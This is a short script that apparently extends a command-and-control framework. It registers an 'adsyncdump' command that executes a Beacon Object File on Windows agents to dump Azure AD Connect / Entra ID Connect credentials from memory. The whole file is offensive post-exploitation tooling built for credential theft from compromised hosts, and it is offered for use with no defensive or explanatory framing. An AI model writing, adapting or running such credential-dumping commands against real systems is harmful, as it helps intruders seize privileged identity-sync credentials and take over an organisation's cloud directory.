var metadata = {
    name: "ADSyncDump",
    description: "Fully in-memory ADSync credential dumper without third-party DLLs"
};

var cmd_adsyncdump = ax.create_command("adsyncdump", "Dump Azure AD Connect / Entra ID Connect credentials from memory", "adsyncdump");
cmd_adsyncdump.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let bof_path = ax.script_dir() + "adsyncdump." + ax.arch(id) + ".o";
    let message = "Dumping ADSync credentials...";
    ax.execute_alias(id, cmdline, `execute bof "${bof_path}"`, message);
});

var group_adsyncdump = ax.create_commands_group("ADSyncDump", [cmd_adsyncdump]);
ax.register_commands_group(group_adsyncdump, ["beacon", "gopher", "kharon"], ["windows"], []);
